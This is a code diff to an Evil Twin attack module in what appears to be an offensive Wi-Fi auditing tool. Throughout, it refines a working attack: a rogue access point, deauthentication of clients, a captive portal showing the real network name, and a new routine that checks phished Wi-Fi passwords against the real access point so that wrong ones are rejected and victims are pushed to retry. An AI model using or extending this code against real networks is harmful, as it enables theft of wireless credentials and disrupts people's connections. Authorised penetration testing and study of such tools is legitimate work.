@@ -101,6 +101,12 @@ class EvilTwin(Attack):
         self.portal_thread = None
         self.deauth_process = None
         self.client_monitor = None
+        # Lazily-created validator that checks captured credentials against the
+        # real target AP (see _verify_password). None until first use.
+        self.credential_validator = None
+        # True once we've switched the dual-mode deauth interface into monitor
+        # mode, so _cleanup() knows to restore it to managed afterwards.
+        self._deauth_monitor_enabled = False
         
         # Statistics and tracking
         self.clients_connected = []
@@ -122,7 +128,8 @@ class EvilTwin(Attack):
         self.cleanup_manager = CleanupManager()
         
         # Adaptive deauth manager for intelligent deauth timing
-        deauth_interval = getattr(Configuration, 'evil_twin_deauth_interval', 5.0)
+        # `or 5.0` guards the pre-initialize state where the class attr is None.
+        deauth_interval = getattr(Configuration, 'eviltwin_deauth_interval', 5.0) or 5.0
         self.adaptive_deauth = AdaptiveDeauthManager(
             base_interval=deauth_interval,
             min_interval=2.0,
@@ -215,7 +222,7 @@ class EvilTwin(Attack):
                     return None
                 
                 # Create assignment from manual configuration
-                from ..model.interface_assignment import InterfaceAssignment
+                from ..model.interface_info import InterfaceAssignment
                 assignment = InterfaceAssignment(
                     attack_type='evil_twin',
                     primary=Configuration.interface_primary,
@@ -417,7 +424,11 @@ class EvilTwin(Attack):
             if monitor_interface != interface:
                 log_info('EvilTwin', f'Deauth interface renamed: {interface} -> {monitor_interface}')
                 self.interface_deauth = monitor_interface
-            
+
+            # Record that we put this interface into monitor mode so _cleanup()
+            # restores it to managed when the attack ends.
+            self._deauth_monitor_enabled = True
+
             # Set channel to match target
             if hasattr(self.target, 'channel') and self.target.channel:
                 log_debug('EvilTwin', f'Setting {self.interface_deauth} to channel {self.target.channel}')
@@ -517,7 +528,9 @@ class EvilTwin(Attack):
             # Start captive portal
             portal_port = getattr(Configuration, 'eviltwin_port', 80)
 
-            self.portal_server = PortalServer(port=portal_port)
+            self.portal_server = PortalServer(
+                port=portal_port,
+                template_renderer=self._build_template_renderer())
             self.portal_server.set_credential_callback(self._portal_credential_callback)
 
             if not self.portal_server.start():
@@ -605,7 +618,7 @@ class EvilTwin(Attack):
                 import contextlib
                 with contextlib.suppress(Exception):
                     current_channel = Airmon.get_interface_channel(interface)
-                    if current_channel and current_channel != self.target.channel:
+                    if current_channel and str(current_channel) != str(self.target.channel):
                         log_warning('EvilTwin', f'Deauth interface on channel {current_channel}, target on {self.target.channel}')
                         Color.pl('{!} {O}Warning: Channel mismatch - deauth may be less effective{W}')
             
@@ -632,7 +645,7 @@ class EvilTwin(Attack):
             True if credentials captured, False otherwise
         """
         try:
-            timeout = getattr(Configuration, 'evil_twin_timeout', 0)
+            timeout = getattr(Configuration, 'eviltwin_timeout', 0) or 0
             last_session_save = time.time()
             session_save_interval = 30
             
@@ -737,12 +750,41 @@ class EvilTwin(Attack):
             if self.attack_view:
                 self.attack_view.add_log("No conflicts detected", timestamp=True)
             
-            # Setup attack components
+            # Decide interface mode BEFORE setup. Dual-interface mode performs
+            # its own interface configuration AND service startup inside
+            # _run_dual_interface(), so we must NOT also run the single-interface
+            # _setup() — doing both would start hostapd/dnsmasq/portal twice on
+            # the same interface and the second start would fail.
+            self.interface_assignment = self._get_interface_assignment()
+
+            if self.interface_assignment and self.interface_assignment.is_dual_interface():
+                # Run in dual interface mode (no mode switching)
+                log_info('EvilTwin', 'Using dual interface mode')
+                Color.pl('{+} {G}Using dual interface mode{W}')
+                Color.pl('{+} {C}Primary (AP):{W} {G}%s{W}' % self.interface_assignment.primary)
+                Color.pl('{+} {C}Secondary (Deauth):{W} {G}%s{W}' % self.interface_assignment.secondary)
+                Color.pl('')
+
+                if self.attack_view:
+                    self.attack_view.add_log("Using dual interface mode - no mode switching required", timestamp=True)
+
+                result = self._run_dual_interface()
+                self.setup_time = time.time() - self.start_time
+                return result
+
+            # Single interface mode (traditional, with mode switching): set up
+            # and start all components here.
+            log_info('EvilTwin', 'Using single interface mode')
+            Color.pl('{+} {C}Using single interface mode{W}')
+            Color.pl('')
+            if self.attack_view:
+                self.attack_view.add_log("Using single interface mode", timestamp=True)
+
             Color.pl('{+} {C}Setting up Evil Twin attack...{W}')
             self.state = AttackState.SETTING_UP
             if self.attack_view:
                 self.attack_view.add_log("Setting up attack components...")
-            
+
             if not self._setup():
                 Color.pl('{!} {R}Failed to setup Evil Twin attack{W}')
                 if self.error_message:
@@ -751,37 +793,13 @@ class EvilTwin(Attack):
                     self.attack_view.add_log(f"Setup failed: {self.error_message}", timestamp=True)
                 self.state = AttackState.FAILED
                 return False
-            
+
             self.setup_time = time.time() - self.start_time
             log_info('EvilTwin', f'Setup completed in {self.setup_time:.2f}s')
-            
+
             if self.attack_view:
                 self.attack_view.add_log(f"Setup completed in {self.setup_time:.2f}s", timestamp=True)
-            
-            # Check for dual interface mode
-            self.interface_assignment = self._get_interface_assignment()
-            
-            if self.interface_assignment and self.interface_assignment.is_dual_interface():
-                # Run in dual interface mode (no mode switching)
-                log_info('EvilTwin', 'Using dual interface mode')
-                Color.pl('{+} {G}Using dual interface mode{W}')
-                Color.pl('{+} {C}Primary (AP):{W} {G}%s{W}' % self.interface_assignment.primary)
-                Color.pl('{+} {C}Secondary (Deauth):{W} {G}%s{W}' % self.interface_assignment.secondary)
-                Color.pl('')
-                
-                if self.attack_view:
-                    self.attack_view.add_log("Using dual interface mode - no mode switching required", timestamp=True)
-                
-                return self._run_dual_interface()
-            else:
-                # Run in single interface mode (traditional with mode switching)
-                log_info('EvilTwin', 'Using single interface mode')
-                Color.pl('{+} {C}Using single interface mode{W}')
-                Color.pl('')
-                
-                if self.attack_view:
-                    self.attack_view.add_log("Using single interface mode", timestamp=True)
-            
+
             # Start attack (single interface mode)
             Color.pl('{+} {G}Evil Twin attack started{W}')
             Color.pl('{+} {C}Rogue AP:{W} {G}%s{W} on channel {G}%s{W}' % (
@@ -800,7 +818,7 @@ class EvilTwin(Attack):
             self.state = AttackState.RUNNING
             
             # Main attack loop (single interface mode)
-            timeout = getattr(Configuration, 'evil_twin_timeout', 0)
+            timeout = getattr(Configuration, 'eviltwin_timeout', 0) or 0
             last_session_save = time.time()
             session_save_interval = 30  # Save session every 30 seconds
             
@@ -1171,7 +1189,9 @@ class EvilTwin(Attack):
             log_info('EvilTwin', f'Starting captive portal on port {portal_port}')
             Color.pl('{+} {C}Starting captive portal...{W}')
 
-            self.portal_server = PortalServer(port=portal_port)
+            self.portal_server = PortalServer(
+                port=portal_port,
+                template_renderer=self._build_template_renderer())
             self.portal_server.set_credential_callback(self._portal_credential_callback)
 
             if not self.portal_server.start():
@@ -1201,7 +1221,7 @@ class EvilTwin(Attack):
             if hasattr(self.target, 'channel') and self.target.channel:
                 with contextlib.suppress(Exception):
                     current_ch = Airmon.get_interface_channel(self.interface_deauth)
-                    if current_ch and current_ch != self.target.channel:
+                    if current_ch and str(current_ch) != str(self.target.channel):
                         log_warning('EvilTwin',
                                     f'Deauth interface on ch {current_ch}, '
                                     f'target on ch {self.target.channel}')
@@ -1215,33 +1235,177 @@ class EvilTwin(Attack):
             self.error_message = f'Setup failed: {e}'
             return False
 
+    def _build_template_renderer(self):
+        """
+        Build a TemplateRenderer for the configured captive-portal template.
+
+        Honors ``Configuration.eviltwin_template`` (--eviltwin-template) and
+        seeds the renderer with the target ESSID so the portal shows the real
+        network name. Returns None on failure, in which case PortalServer falls
+        back to its built-in default page.
+        """
+        try:
+            from .portal.templates import TemplateRenderer
+            template_name = getattr(Configuration, 'eviltwin_template', 'generic') or 'generic'
+            renderer = TemplateRenderer(
+                template_name=template_name,
+                target_ssid=self.target.essid or '',
+            )
+            log_info('EvilTwin', f'Captive portal template: {template_name}')
+            return renderer
+        except Exception as e:
+            log_warning('EvilTwin',
+                        f'Failed to build portal template renderer '
+                        f'(using default page): {e}')
+            return None
+
     def _portal_credential_callback(self, ssid: str, password: str, client_ip: str) -> bool:
         """
         Callback invoked by the portal server when a client submits credentials.
 
-        Records the attempt in the client monitor, creates a CrackResult on
-        the first submission, and signals the main attack loop to stop.
+        When credential validation is enabled (``eviltwin_validate_credentials``)
+        and a spare interface is available, the submitted password is checked
+        against the REAL target AP before being accepted — so a reported success
+        means a *verified* key. A confirmed-wrong password is rejected (the
+        client sees the error page and can retry). When validation can't run, the
+        credential is still captured but clearly flagged as unverified.
 
         Returns:
-            True (always accepts — we capture and stop).
+            True  if accepted (verified, or captured-unverified) — stops the attack.
+            False if confirmed wrong — the client should retry, attack continues.
         """
         log_info('EvilTwin', f'Credential received from {client_ip}: SSID={ssid}')
 
-        # Record in client monitor statistics
+        verified = self._verify_password(ssid, password)
+
+        if verified is False:
+            # Confirmed wrong against the real AP — reject and keep the attack
+            # running so the client can retry (portal shows the error page).
+            if self.client_monitor:
+                self.client_monitor.record_credential_attempt(client_ip, success=False)
+            self.credential_attempts.append({
+                'client_ip': client_ip,
+                'mac': client_ip,
+                'ssid': ssid,
+                'password': password,
+                'success': False,
+                'timestamp': time.time(),
+            })
+            Color.pl('\n{!} {O}Rejected credential from {C}%s{O}: '
+                     'failed validation against the real AP{W}' % client_ip)
+            return False
+
+        # verified is True (confirmed) or None (could not verify → capture-only)
         if self.client_monitor:
             self.client_monitor.record_credential_attempt(client_ip, success=True)
 
         # Store the result — the monitoring loop checks self.crack_result
         self.crack_result = self.create_result(password)
+        # Annotate verification status for downstream reporting.
+        self.crack_result.verified = (verified is True)
         self.credential_attempts.append({
             'client_ip': client_ip,
+            'mac': client_ip,
             'ssid': ssid,
             'password': password,
+            'success': True,
             'timestamp': time.time(),
         })
 
-        Color.pl('\n{+} {G}Credential captured from {C}%s{W}' % client_ip)
+        if verified is True:
+            Color.pl('\n{+} {G}Credential captured and {C}VERIFIED{G} against the '
+                     'real AP from {C}%s{W}' % client_ip)
+        else:
+            Color.pl('\n{+} {G}Credential captured from {C}%s{W}' % client_ip)
+            Color.pl('{!} {O}Note: not verified against the real AP '
+                     '(validation unavailable) — treat as unconfirmed{W}')
         return True
+
+    def _verify_password(self, ssid: str, password: str):
+        """
+        Verify a submitted password against the REAL target AP.
+
+        Validation runs wpa_supplicant against the legitimate AP, which needs a
+        managed-mode radio. The AP interface is busy serving the rogue AP, so we
+        can only validate when a separate (deauth) interface exists — which we
+        briefly switch to managed mode and restore afterwards.
+
+        Returns:
+            True  — confirmed correct against the real AP.
+            False — confirmed incorrect.
+            None  — could not validate (disabled, no spare interface, missing
+                    wpa_supplicant, or error); caller treats it as an unverified
+                    capture rather than a confirmed key.
+        """
+        import contextlib
+
+        if not getattr(Configuration, 'eviltwin_validate_credentials', True):
+            return None  # validation disabled → capture-only
+
+        iface = self.interface_deauth
+        if not iface or iface == self.interface_ap:
+            log_warning('EvilTwin',
+                        'No spare interface to verify credentials against the '
+                        'real AP; capturing as unverified')
+            return None
+
+        if not Process.exists('wpa_supplicant'):
+            log_warning('EvilTwin',
+                        'wpa_supplicant not found; capturing credential unverified')
+            return None
+
+        from ..tools.iw import Iw
+        from ..tools.ip import Ip
+        from ..util.credential_validator import CredentialValidator
+
+        # Pause deauth and borrow the secondary interface in managed mode so
+        # wpa_supplicant can associate with the real AP.
+        was_paused = self.adaptive_deauth.is_paused
+        self.adaptive_deauth.pause()
+        switched = False
+        try:
+            with contextlib.suppress(Exception):
+                Ip.down(iface)
+                Iw.mode(iface, 'managed')
+                Ip.up(iface)
+                switched = True
+
+            if not switched:
+                log_warning('EvilTwin',
+                            'Could not switch %s to managed mode for validation; '
+                            'capturing unverified' % iface)
+                return None
+
+            if self.credential_validator is None:
+                self.credential_validator = CredentialValidator(
+                    interface=iface,
+                    target_bssid=self.target.bssid,
+                    target_channel=int(self.target.channel),
+                )
+
+            Color.pl('{+} {C}Verifying credential against the real AP...{W}')
+            is_valid, _vtime, err = self.credential_validator.validate_credentials(
+                ssid, password)
+            if is_valid:
+                log_info('EvilTwin', 'Credential verified against real AP')
+            else:
+                log_info('EvilTwin', f'Credential failed validation: {err}')
+            return bool(is_valid)
+
+        except Exception as e:
+            log_warning('EvilTwin',
+                        f'Credential validation error: {e}; capturing unverified')
+            return None
+
+        finally:
+            # Restore monitor mode so deauth can resume.
+            with contextlib.suppress(Exception):
+                if switched:
+                    Ip.down(iface)
+                    Iw.mode(iface, 'monitor')
+                    Ip.up(iface)
+            if not was_paused:
+                self.adaptive_deauth.resume()
     
     def _handle_deauth(self):
         """
@@ -1491,7 +1655,24 @@ class EvilTwin(Attack):
                 self.hostapd = None
             if self.hostapd_process:
                 self.hostapd_process = None
-            
+
+            # Restore the dual-mode deauth interface from monitor back to
+            # managed mode (it was switched to monitor in
+            # _configure_deauth_interface). Best-effort — never abort cleanup.
+            if self._deauth_monitor_enabled and self.interface_deauth \
+                    and self.interface_deauth != self.interface_ap:
+                try:
+                    from ..tools.airmon import Airmon
+                    log_debug('EvilTwin',
+                              f'Restoring deauth interface {self.interface_deauth} to managed mode')
+                    Airmon.set_interface_mode(self.interface_deauth, 'managed')
+                except Exception as e:
+                    log_warning('EvilTwin',
+                                f'Failed to restore deauth interface {self.interface_deauth} '
+                                f'to managed mode: {e}')
+                finally:
+                    self._deauth_monitor_enabled = False
+
             # Register temporary files for removal
             for temp_file in self.temp_files:
                 self.cleanup_manager.register_temp_file(temp_file)
@@ -1573,7 +1754,7 @@ class EvilTwin(Attack):
             clients_connected=len(self.clients_connected),
             credential_attempts=len(self.credential_attempts),
             validation_time=validation_time,
-            portal_template=getattr(Configuration, 'evil_twin_portal_template', 'generic')
+            portal_template=getattr(Configuration, 'eviltwin_template', 'generic')
         )
         
         log_info('EvilTwin', f'Created result for {self.target.essid}: {mask_sensitive(password)}')
@@ -1865,8 +2046,8 @@ class EvilTwin(Attack):
         state = EvilTwinAttackState(
             interface_ap=self.interface_ap,
             interface_deauth=self.interface_deauth,
-            portal_template=getattr(Configuration, 'evil_twin_portal_template', 'generic'),
-            deauth_interval=getattr(Configuration, 'evil_twin_deauth_interval', 5),
+            portal_template=getattr(Configuration, 'eviltwin_template', 'generic'),
+            deauth_interval=getattr(Configuration, 'eviltwin_deauth_interval', 5),
             attack_phase=self.state.value if hasattr(self.state, 'value') else str(self.state),
             start_time=self.start_time,
             setup_time=self.setup_time,
